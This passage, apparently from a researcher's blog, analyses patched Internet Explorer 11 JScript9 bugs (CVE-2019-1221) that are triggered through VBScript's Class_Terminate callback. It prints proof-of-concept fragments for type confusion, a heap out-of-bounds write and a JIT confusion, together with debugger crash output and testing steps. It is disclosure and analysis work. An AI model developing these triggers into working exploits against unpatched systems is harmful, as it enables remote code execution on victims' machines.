        arr_arr.push(-(0x100000000 - 0x88888888));
    }
    } catch (e){
        alert(e);
    }
        alert(arr_arr.pop());
If you open the PoC with the vulnerable version of Internet Explorer 11, it
will crash when using the integer value 0x88888888 as an object:
(4d54.312c): Access violation - code c0000005 (!!! second chance !!!)
eax=0604d0a6 ebx=88888888 ecx=08f5907e edx=00214e48 esi=00000006 edi=08f5907e
eip=65000f89 esp=0604d070 ebp=0604d088 iopl=0 nv up ei pl zr na pe nc cs=0023
ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010246
jscript9!ValueType::Merge+0x19: 65000f89 8b0b mov ecx,dword ptr [ebx]
ds:002b:88888888=????????
### Case 2: Heap Buffer OOB write in JavaScirptArray::EntryShift
The below PoC will trigger a heap oob write in JavaScriptArray::EntryShift:
    var seg_size = 0x400;
    var seg_off = 0x100;
    var next_seg_left = seg_size + seg_off;
    var next_seg_size = 0x100000;
    for (var i = 0; i 
And what happens in this PoC:
In JavaScriptArray::EntryShift, if the shift operation causes the head segment
and head->next segment to overlap, it will try to merge the 2 segments by:
1.Allocate a new segment whose size is big enough to hold elements in the two
segments.
2.Copy the elements in head and head->next into the new allocated segment.
By using the GC & Class_Terminate trick here we can trigger a callback at step
(1). And if we grow the size of the head segment inside the callback, after
returned from the callback, the new allocated segment will have insufficient
size to hold the new elements. This will result in a heap buffer OOB write.
This vulnerability could be leveraged to achieve reliable remote code
execution easily as well.
The crash info for this PoC looks like this:
    (4e7c.372c): Access violation - code c0000005 (!!! second chance !!!)
    eax=2d68dc28 ebx=2d190010 ecx=0003bb09 edx=00000000 esi=2d59f004 edi=0b510000
    eip=74b995fa esp=05a0d0ac ebp=05a0d0b4 iopl=0         nv up ei pl nz ac pe nc
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010216
    msvcrt!memmove+0x5a:
    74b995fa f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
    0:009> k
    ChildEBP RetAddr  
    05a0d0b4 67e1f2db msvcrt!memmove+0x5a
    05a0d150 67d35ccd jscript9!Js::JavascriptArray::EntryShift+0xea20b
    05a0d170 67d1f4ec jscript9!Js::InterpreterStackFrame::DoProfiledSetProperty+0xc9
    05a0d1a8 67d21808 jscript9!Js::InterpreterStackFrame::OP_ProfiledLoopBodyStart+0xdc
    05a0d1d8 67d20eb9 jscript9!Js::InterpreterStackFrame::Process+0x5b8
    05a0d304 08b00fd9 jscript9!Js::InterpreterStackFrame::InterpreterThunk+0x2a9
### Case 3: Type Confusion in JIT Engine
A more interesting case is that we can use this trick to cause vulnerabilities
in the JavaScript JIT engine. Consider the following PoC:
    function func(a, b, c) {
        a[0] = 1.2;            
The PoCs were tested and confirmed to work on windows 10.0.18362.295. To test
the PoC, right-click the PoC and chose “open with” => “Internet Explorer”. The
PoC may not work if you put it under a web server by default, because
Microsoft has disabled VBScript execution for Internet Zone both on Windows 7
(Since August 2019) and Windows 10.
### Conclusion
The above cases are just examples of how to exploit this issue. There are many
other places in the JavaScript engine where we can trigger a callback using
this trick and cause exploitable conditions. We have reported all the cases to
Microsoft, all the cases are fixed as CVE-2019-1221 released in September. A
quick analysis shows that the issues are addressed by disabling object dispose
(free) in GC when the GC is triggered by memory allocation.
I think this case is quite interesting because the “Class_Terminate” function
itself is just a feature in VBScript which seems no harm. But when we combine
this feature with other features in other modules (the JavaScript engine in
this article, or some other modules which we may introduce in later blogs), we
can get exploitable vulnerabilities. While there are lots of vulnerabilities
discovered inside a single script engine (VBScript, Jscript9, …) these years,
the bugs we discussed in this blog existed since the born of the Jscript9
engine and lived for quite a long period. I think one of the reasons for the
long living is that we need to think cross the boundary of a single script
engine and try to combine the VBScript/Jscript engines together in order to
discover them. This also reminds me to think broadly when doing bug hunting.
* * *